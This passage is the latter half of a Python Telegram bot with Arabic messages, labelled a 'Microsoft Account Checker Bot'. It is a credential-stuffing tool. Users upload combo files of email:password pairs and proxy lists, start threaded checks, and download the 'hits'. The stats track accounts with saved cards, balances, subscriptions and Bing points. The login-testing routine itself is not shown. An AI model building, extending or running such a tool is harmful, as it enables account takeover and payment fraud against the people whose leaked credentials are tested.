        threading.Thread(target=run_scan, daemon=True).start()
        
        # تحديث الحالة كل 10 ثوانٍ
        await update_status_message(context, query.message)
        return
    
    # ========== زر: إيقاف الفحص ==========
    if query.data == 'stop_scan':
        if not scan_active:
            await query.edit_message_text(
                "⚠️ *لا يوجد فحص نشط.*",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            return
        scan_active = False
        await query.edit_message_text(
            f"⏹ *تم إيقاف الفحص.*\n"
            f"✅ تم فحص {stats['checked']} كومبو\n"
            f"🎯 الإصابات: {stats['hits']}",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    # ========== زر: الإحصائيات ==========
    if query.data == 'stats':
        elapsed = int(time.time() - stats['start_time'])
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        cpm = int((stats['checked'] / elapsed) * 60) if elapsed > 0 else 0
        
        stats_text = (
            f"📊 *الإحصائيات*\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 إجمالي الكومبو: {stats['total_combos']}\n"
            f"✅ تم الفحص: {stats['checked']}\n"
            f"🎯 الإصابات: {stats['hits']}\n"
            f"❌ فاشل: {stats['bad']}\n"
            f"🔐 2FA: {stats['two_factor']}\n"
            f"🌐 أخطاء بروكسي: {stats['proxy_errors']}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"💳 حسابات ببطاقة: {stats['accounts_with_cc']}\n"
            f"💰 حسابات برصيد: {stats['accounts_with_balance']}\n"
            f"📦 حسابات باشتراك: {stats['accounts_with_subscription']}\n"
            f"⭐ نقاط Bing: {stats['accounts_with_points']}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"⏱ الزمن: {hours:02d}:{minutes:02d}:{seconds:02d}\n"
            f"⚡ CPM: {cpm}\n"
            f"📌 الحالة: {'🟢 نشط' if scan_active else '🔴 متوقف'}"
        )
        await query.edit_message_text(
            stats_text,
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    # ========== زر: تحميل النتائج ==========
    if query.data == 'download_results':
        if not results_hits:
            await query.edit_message_text(
                "❌ *لا توجد نتائج للتحميل.*",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            return
        
        file_path = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write("\n\n".join(results_hits))
        
        with open(file_path, 'rb') as f:
            await query.message.reply_document(
                document=f,
                filename=file_path,
                caption=f"📥 النتائج: {len(results_hits)} إصابة"
            )
        os.remove(file_path)
        await query.edit_message_text(
            "📥 *تم إرسال الملف.*",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    # ========== زر: رفع كومبو ==========
    if query.data == 'upload_combo':
        await query.edit_message_text(
            "📤 *أرسل ملف .txt يحتوي على الكومبو*\n"
            "📌 الصيغة: `ايميل:باسورد` (كل سطر واحد)\n"
            "━━━━━━━━━━━━━━━━━\n"
            "مثال:\n"
            "`user1@example.com:pass123`\n"
            "`user2@outlook.com:pass456`",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    # ========== زر: رفع بروكسي ==========
    if query.data == 'upload_proxy':
        await query.edit_message_text(
            "🌐 *أرسل ملف .txt يحتوي على البروكسيات*\n"
            "📌 الصيغة: `ip:port` أو `protocol://ip:port`\n"
            "━━━━━━━━━━━━━━━━━\n"
            "مثال:\n"
            "`192.168.1.1:8080`\n"
            "`http://proxy.com:3128`",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    # ========== زر: مسح الكل ==========
    if query.data == 'clear_results':
        combo_queue = queue.Queue()
        proxy_list = []
        results_hits = []
        results_details = []
        with HDRStatusL:
            stats['total_combos'] = 0
            stats['checked'] = 0
            stats['hits'] = 0
            stats['bad'] = 0
            stats['two_factor'] = 0
            stats['proxy_errors'] = 0
            stats['accounts_with_cc'] = 0
            stats['accounts_with_balance'] = 0
            stats['accounts_with_subscription'] = 0
            stats['accounts_with_points'] = 0
            stats['start_time'] = time.time()
        await query.edit_message_text(
            "🗑 *تم مسح جميع البيانات.*",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    # ========== زر: المساعدة ==========
    if query.data == 'help':
        await query.edit_message_text(
            "🤖 *Microsoft Account Checker Bot*\n"
            "━━━━━━━━━━━━━━━━━\n"
            "📌 *الأزرار:*\n"
            "🚀 بدء الفحص - يبدأ فحص الكومبو\n"
            "⏹ إيقاف - يوقف الفحص الجاري\n"
            "📊 إحصائيات - يعرض تفاصيل الفحص\n"
            "📥 تحميل النتائج - يرسل ملف النتائج\n"
            "📤 رفع كومبو - رفع ملف ايميلات\n"
            "🌐 رفع بروكسي - رفع بروكسيات\n"
            "🗑 مسح الكل - حذف جميع البيانات\n"
            "━━━━━━━━━━━━━━━━━\n"
            "📌 *رفع الملفات:*\n"
            "• ملف كومبو: `ايميل:باسورد`\n"
            "• ملف بروكسي: `ip:port`",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج رفع الملفات - يكتشف نوع الملف تلقائياً"""
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ يرجى إرسال ملف .txt فقط.")
        return
    
    file = await document.get_file()
    file_path = f"temp_{document.file_id}.txt"
    await file.download_to_drive(file_path)
    
    # تحديد نوع الملف
    is_proxy = False
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            first_line = f.readline().strip()
            if ':' in first_line and '@' in first_line:
                is_proxy = False
            else:
                is_proxy = True
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {str(e)}")
        os.remove(file_path)
        return
    
    if not lines:
        await update.message.reply_text("❌ الملف فارغ.")
        os.remove(file_path)
        return
    
    global combo_queue, proxy_list, stats
    
    if is_proxy:
        formatted_proxies = []
        for line in lines:
            if not re.match(r'^(http|https|socks4|socks5)://', line):
                line = f"http://{line}"
            formatted_proxies.append(line)
        proxy_list = formatted_proxies
        await update.message.reply_text(
            f"✅ *تم تحميل {len(proxy_list)} بروكسي.*\n"
            f"🌐 استخدم زر 'بدء الفحص'",
            reply_markup=get_main_keyboard(),
            parse_mode='Markdown'
        )
    else:
        valid_lines = [line for line in lines if ':' in line and len(line.split(':', 1)) == 2]
        if not valid_lines:
            await update.message.reply_text("❌ الملف لا يحتوي على كومبو صالح.")
            os.remove(file_path)
            return
        
        combo_queue = queue.Queue()
        for line in valid_lines:
            combo_queue.put(line)
        
        stats['total_combos'] = len(valid_lines)
        await update.message.reply_text(
            f"✅ *تم تحميل {len(valid_lines)} كومبو.*\n"
            f"📌 استخدم زر 'بدء الفحص'",
            reply_markup=get_main_keyboard(),
            parse_mode='Markdown'
        )
    
    os.remove(file_path)

async def update_status_message(context, message):
    """تحديث حالة الفحص كل 10 ثوانٍ"""
    while scan_active:
        elapsed = int(time.time() - stats['start_time'])
        cpm = int((stats['checked'] / elapsed) * 60) if elapsed > 0 else 0
        
        status_text = (
            f"🔄 *جاري الفحص...*\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"✅ تم الفحص: {stats['checked']}/{stats['total_combos']}\n"
            f"🎯 الإصابات: {stats['hits']}\n"
            f"⚡ CPM: {cpm}\n"
            f"⏱ الزمن: {elapsed}s"
        )
        try:
            await message.edit_text(
                status_text,
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass
        await asyncio.sleep(10)

# ==================== تشغيل البوت ====================

def main():
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    print("🔐 تشغيل بوت Microsoft Checker (أزرار تفاعلية)...")
    print(f"👤 المعرف الخاص: {ADMIN_ID}")
    
    application = Application.builder().token(TOKEN).build()
    
    # الأوامر
    application.add_handler(CommandHandler("start", start))
    
    # الأزرار
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # رفع الملفات
    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    application.run_polling()

if __name__ == "__main__":
    main()